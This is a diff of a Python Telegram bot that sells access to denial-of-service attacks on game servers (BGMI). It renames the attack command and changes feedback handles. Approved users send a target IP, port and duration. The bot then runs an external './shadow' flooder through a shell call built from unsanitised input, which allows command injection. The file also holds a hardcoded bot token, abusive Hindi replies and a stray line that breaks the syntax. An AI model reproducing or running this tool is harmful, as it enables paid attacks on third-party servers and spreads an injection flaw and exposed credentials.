@@ -2,21 +2,14 @@ import telebot
 import subprocess
 import datetime
 import os
-#from flask import Flask
 
-# insert your Telegram bot token here
 bot = telebot.TeleBot('7824390469:AAG6YaSxzd6gHIl5vA5eBOjUAsByPwPiJ9U')
 
-# Admin user IDs
 admin_id = ["8024976227","6312238286"]
-
-# File to store allowed user IDs
 USER_FILE = "users.txt"
 
-# File to store command logs
 LOG_FILE = "log.txt"
 
-# Function to read user IDs from the file
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
@@ -24,13 +17,12 @@ def read_users():
     except FileNotFoundError:
         return []
 
-# Function to read free user IDs and their credits from the file
 def read_free_users():
     try:
         with open(FREE_USER_FILE, "r") as file:
             lines = file.read().splitlines()
             for line in lines:
-                if line.strip():  # Check if line is not empty
+                if line.strip():
                     user_info = line.split()
                     if len(user_info) == 2:
                         user_id, credits = user_info
@@ -40,10 +32,10 @@ def read_free_users():
     except FileNotFoundError:
         pass
 
-# List to store allowed user IDs
+
 allowed_user_ids = read_users()
 
-# Function to log command to the file
+
 def log_command(user_id, target, port, time):
     admin_id = ["8024976227"]
     user_info = bot.get_chat(user_id)
@@ -52,10 +44,10 @@ def log_command(user_id, target, port, time):
     else:
         username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+    with open(LOG_FILE, "a") as file:
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-# Function to clear logs
+
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
@@ -68,7 +60,6 @@ def clear_logs():
         response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙"
     return response
 
-# Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
@@ -83,10 +74,8 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
 
 import datetime
 
-# Dictionary to store the approval expiry date for each user
 user_approval_expiry = {}
 
-# Function to calculate remaining approval time
 def get_remaining_approval_time(user_id):
     expiry_date = user_approval_expiry.get(user_id)
     if expiry_date:
@@ -98,7 +87,6 @@ def get_remaining_approval_time(user_id):
     else:
         return "N/A"
 
-# Function to add or update user approval expiry date
 def set_approval_expiry_date(user_id, duration, time_unit):
     current_time = datetime.datetime.now()
     if time_unit == "hour" or time_unit == "hours":
@@ -108,14 +96,14 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     elif time_unit == "week" or time_unit == "weeks":
         expiry_date = current_time + datetime.timedelta(weeks=duration)
     elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)
     else:
         return False
     
     user_approval_expiry[user_id] = expiry_date
     return True
 
-# Command handler for adding a user with approval time
+
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
@@ -126,10 +114,10 @@ def add_user(message):
             duration_str = command[2]
 
             try:
-                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                duration = int(duration_str[:-4])
                 if duration <= 0:
                     raise ValueError
-                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                time_unit = duration_str[-4:].lower()
                 if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                     raise ValueError
             except ValueError:
@@ -154,7 +142,6 @@ def add_user(message):
 
     bot.reply_to(message, response)
 
-# Command handler for retrieving user info
 @bot.message_handler(commands=['myinfo'])
 def get_user_info(message):
     user_id = str(message.chat.id)
@@ -270,7 +257,7 @@ def show_recent_logs(message):
         bot.reply_to(message, response)
 
 
-# Function to handle the reply when free users run the /bgmi command
+
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -278,50 +265,48 @@ def start_attack_reply(message, target, port, time):
     response = f"🚀 BGMI KI MA CHUD GAYI HAI 🥵 JALDI SE FEEDBACK DO @SHADOW_OFFICIAL11🚀\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙏𝙞𝙢𝙚: {time} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙣𝙖𝙢𝙚: @{username}"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /bgmi command
+
 bgmi_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+
+@bot.message_handler(commands=['soulcracks'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
+)
         if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
+
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                 response = "𝙔𝙤𝙪𝙧 𝙖𝙧𝙚 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙬𝙖𝙞𝙩 300 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙤 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣"
                 bot.reply_to(message, response)
                 return
-            # Update the last time the user ran the command
+
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
+            port = int(command[2])
+            time = int(command[3])
             if time > 120:
                 response = "GAND DEGA KYA ITNA JADA SECOND LAGA KE 120 SEC LAGA "
             else:
                 record_command_logs(user_id, '/jonysins', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                start_attack_reply(message, target, port, time)
                 full_command = f"./shadow {target} {port} {time}"
                 process = subprocess.run(full_command, shell=True)
                 response = f"[𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙] 😈BAHAN KE LODE FEEDBACK DEDE AB KYA MA CHUDATA RAHEGA ATTACK LAGA LAGA KE 😈"
-                #bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀> 😈ANDI MANDI SANDI JO FEEDBACK NA DE OSKI MA RANDI 😈 SEND A FEEDBACK @SHADOW_OFFICIAL11"  # Updated command syntax
+            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀> 😈ANDI MANDI SANDI JO FEEDBACK NA DE OSKI MA RANDI 😈 SEND A FEEDBACK @SOULCRACKS"
     else:
         response = ("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
 
     bot.reply_to(message, response)
 
 
-# Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -433,10 +418,10 @@ def welcome_plan(message):
 
 
 
-#bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
+bot.polling()
+#while True:
+ #   try:
+  #      bot.polling(none_stop=True)
+   # except Exception as e:
+    #    print(e)
 
